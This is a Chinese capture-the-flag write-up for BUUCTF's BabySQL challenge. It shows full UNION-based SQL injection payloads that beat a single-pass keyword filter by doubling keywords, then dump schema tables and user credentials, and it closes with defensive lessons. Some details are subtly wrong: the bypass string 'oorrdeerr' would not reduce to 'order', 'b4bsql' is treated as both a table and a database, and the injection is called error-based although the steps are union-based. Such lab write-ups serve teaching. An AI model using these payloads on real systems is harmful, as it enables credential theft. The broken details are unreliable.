# [极客大挑战 2019]BabySQL

## 题目概述

BUUCTF 平台上的 SQL 注入入门题目。登录页面存在 SQL 注入漏洞，服务端对常见 SQL 关键词做了黑名单过滤，但过滤方式存在缺陷，可通过双写绕过。

## 信息收集

- 访问题目，是一个登录页面，包含用户名（username）和密码（password）两个输入框
- 尝试在 password 字段输入单引号 `'`，页面返回 SQL 报错信息，确认存在 SQL 注入点
- 服务端 SQL 语句大致为：`SELECT * FROM users WHERE username='$username' AND password='$password'`

## 漏洞分析

1. **注入点确认**：password 参数未做任何预处理或参数化，直接拼接进 SQL 语句
2. **过滤机制**：服务端对输入中的 `or`、`select`、`union`、`from`、`where`、`by` 等关键词做字符串替换删除，且只执行一次
3. **绕过思路**：由于替换只执行一次，可以采用双写绕过。例如 `ununionion` 经过一次删除后变为 `union`

## 利用过程

### 1. 判断字段数

使用 `ORDER BY` 判断查询的字段数（`by` 被过滤，双写为 `oorrdeerr bbyy`）：

```
password=1' oorrdeerr bbyy 3--+
```

确认字段数为 3。

### 2. 联合查询获取数据库名

`union`、`select` 被过滤，双写绕过：

```
password=1' ununionion selselectect 1,2,3--+
```

回显位为 2 和 3。

### 3. 获取表名

`from` 被过滤，双写为 `frfromom`；`or` 被过滤，`information` 中的 `or` 也需要处理：

```
password=1' ununionion selselectect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()--+
```

得到关键表：`b4bsql`，其中包含 `users` 表。

### 4. 获取列名

注意 `or` 在 `columns` 中不存在问题，但 `password` 列名本身包含 `or`，需要双写为 `passwoorrd`：

```
password=1' ununionion selselectect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'--+
```

得到列名：`username`、`passwoorrd`（实际列名为 `password`，但查询时需双写绕过过滤）。

### 5. 获取 Flag

```
password=1' ununionion selselectect 1,group_concat(username,0x3a,passwoorrd),3 frfromom b4bsql.users--+
```

在查询结果中找到 flag。

## 复现步骤

1. 访问 BUUCTF 题目页面
2. 在 password 输入框输入以下 payload（username 任意）：

```
1' ununionion selselectect 1,group_concat(username,0x3a,passwoorrd),3 frfromom b4bsql.users--+
```

3. 提交后页面回显中包含 flag

## 技术总结

- **漏洞类型**：基于报错的字符型 SQL 注入
- **过滤方式**：黑名单关键词替换删除（仅一次）
- **绕过方法**：双写关键词，如 `ununionion` → 删除中间 `union` → `union`
- **被过滤关键词**：`or`、`select`、`union`、`from`、`where`、`by`
- **特殊注意**：列名 `password` 包含 `or`，查询时需双写为 `passwoorrd`

## 知识总结

1. **黑名单过滤的局限性**：简单的字符串替换删除如果只执行一次，可以通过双写轻松绕过。安全的过滤应使用递归替换或白名单机制
2. **SQL 注入防御**：应使用参数化查询（PreparedStatement）而非字符串拼接
3. **信息泄露**：页面返回 SQL 报错信息本身就是安全隐患，生产环境应关闭详细错误回显
4. **关键词双写对照表**：
   - `or` → `oorr`
   - `select` → `selselectect`
   - `union` → `ununionion`
   - `from` → `frfromom`
   - `where` → `whwhereere`
   - `order by` → `oorrdeerr bbyy`
